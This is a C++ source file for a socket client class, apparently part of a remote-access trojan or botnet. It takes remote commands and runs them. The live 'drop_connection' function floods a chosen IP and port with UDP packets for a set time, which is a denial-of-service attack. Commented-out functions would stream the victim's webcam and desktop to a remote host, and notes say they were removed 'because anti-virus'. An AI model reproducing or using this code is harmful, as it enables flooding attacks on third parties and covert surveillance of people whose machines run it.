#include "socket_client.h"
#include <func/image.hpp>


void socket_client::set_config(uint16_t _port, std::string _ip)
{
	port = _port;
	ip = _ip;
}

bool socket_client::drop_connection(std::string _port, std::string _ip, std::string seconds)
{
	set_config(
		std::stoi(_port),
		_ip
	);

	if (!open_socket_udp())
		return false;
	
	send_packets(
		std::stoi(seconds)
	);

	return true;
}

bool socket_client::webcam_realtime(std::string port, std::string ip)
{
	set_config(
		std::stoi(port),
		ip
	);

	if (!open_socket_tcp())
		return false;

	send_image_webcam();

	return true;
}

bool socket_client::desktop_realtime(std::string port, std::string ip)
{
	set_config(
		std::stoi(port),
		ip
	);

	if (!open_socket_tcp()) {
		std::cout << "\nErro na conexao com o socket";
		return false;
	}

	send_image_desktop();

	return true;
}

void socket_client::init_thread_timeout()
{
	std::thread(
		std::bind(
			&socket_client::thread_timeout,
			this
		)
	).detach();
}

void socket_client::thread_timeout()
{
	set_time_now();
	while (true)
	{
		auto _elapsed = get_elapsed_time();
		if (_elapsed > 10) {
			if (socket_udp.is_open())
				socket_udp.close();

			if (socket_tcp.is_open())
				socket_tcp.close();

			break;
		}
		std::this_thread::sleep_for(
			std::chrono::seconds(3)
		);
	}
}

void socket_client::set_time_now()
{
	std::lock_guard<std::mutex> lock(mtx);
	start_time = std::chrono::steady_clock::now();
}

double socket_client::get_elapsed_time()
{
	std::chrono::steady_clock::time_point end_time = std::chrono::steady_clock::now();
	auto time = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
	return time*1.0;
}

bool socket_client::open_socket_udp()
{
	socket_udp.open(
		boost::asio::ip::udp::v4(),
		error
	);

	if (error) {
		std::cout << "error " << error.message() << '\n';
		return false;
	}

	return true;
}



void socket_client::send_packets(uint32_t seconds)
{
	boost::asio::ip::udp::endpoint remote_endpoint;
	remote_endpoint = boost::asio::ip::udp::endpoint(
		boost::asio::ip::address::from_string(ip),
		port
	);

	auto start_time = std::chrono::system_clock::now();
	long long time_elapsed = 0;

	do {
		socket_udp.send_to(
			boost::asio::buffer(buffer),
			remote_endpoint
		);
		auto end_time = std::chrono::system_clock::now();
		time_elapsed = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
		
	} while (seconds > time_elapsed);

}

void socket_client::execute()
{
	auto funct = fetch_function(results["method"]);
	results["completed"] = funct();
}

void socket_client::on_execute()
{

}

void socket_client::run(
	std::string id,
	bool response,
	std::string method,
	std::vector<std::string> args
) {
	base_task::run(id, response, method, args);
}

_function socket_client::fetch_function(std::string _function_name)
{
	if (_function_name == "drop_connection")
		return std::bind(
			&socket_client::drop_connection,
			this,
			_args[0],
			_args[1],
			_args[2]
		);
	if (_function_name == "webcam_realtime")
		return std::bind(
			&socket_client::webcam_realtime,
			this,
			_args[0],
			_args[1]
		);
	if (_function_name == "desktop_realtime")
		return std::bind(
			&socket_client::desktop_realtime,
			this,
			_args[0],
			_args[1]
		);
	return _function();
}

/// METHODS REMOVED FOR TESTS!!

bool socket_client::open_socket_tcp()
{
	// Removed because anti-virus
	/*socket_tcp.connect(boost::asio::ip::tcp::endpoint(
	boost::asio::ip::address::from_string(ip),
	port
	), error);

	if (error)
	return false;*/
	return true;
}

void socket_client::send_image_desktop()
{
	// Removed because anti-virus
	/*cv::Mat frame;
	boost::system::error_code ignored_error;
	std::vector<int> param = std::vector<int>(2);

	param[0] = CV_IMWRITE_JPEG_QUALITY;
	param[1] = 95;

	init_thread_timeout();
	while (true)
	{
	if (!socket_tcp.is_open()) {
	std::cout << "\nSocket fechado!";
	break;
	}

	HWND hwndDesktop = GetDesktopWindow();
	frame = hyz::hwnd2mat(hwndDesktop);

	if (frame.empty())
	break;
	if (!send_image(frame, param))
	break;
	}
	std::cout << "send image finished" << std::endl;*/
}

void socket_client::send_image_webcam()
{
	// Removed because anti-virus
	/*cv::VideoCapture cap(0);
	cv::Mat frame;
	boost::system::error_code ignored_error;
	std::vector<int> param = std::vector<int>(2);

	if (!cap.isOpened())
	return;

	cap.set(CV_CAP_PROP_FRAME_WIDTH, 320);
	cap.set(CV_CAP_PROP_FRAME_HEIGHT, 240);

	param[0] = CV_IMWRITE_JPEG_QUALITY;
	param[1] = 95;

	init_thread_timeout();
	while (true)
	{
	if (!socket_tcp.is_open())
	break;
	cap >> frame;
	if (frame.empty())
	break;
	cv::waitKey(100);
	if (!send_image(frame, param))
	break;
	}
	std::cout << "send image finished" << std::endl;*/
}

bool socket_client::send_image(
	cv::Mat& frame,
	std::vector<int>& param
) {
	// Removed because anti-virus
	/*std::vector<uchar> buff;
	boost::system::error_code ignored_error;

	cv::imencode(".jpg", frame, buff, param);

	std::string headlength(std::to_string(buff.size()));
	headlength.resize(16);

	set_time_now();
	std::size_t length = boost::asio::write(
	socket_tcp,
	boost::asio::buffer(headlength),
	boost::asio::transfer_all(),
	ignored_error
	);
	std::size_t lengthbody = boost::asio::write(
	socket_tcp,
	boost::asio::buffer(std::string(buff.begin(), buff.end())),
	boost::asio::transfer_all(),
	ignored_error
	);

	if (!length || !lengthbody)
	return false;*/
	return true;
}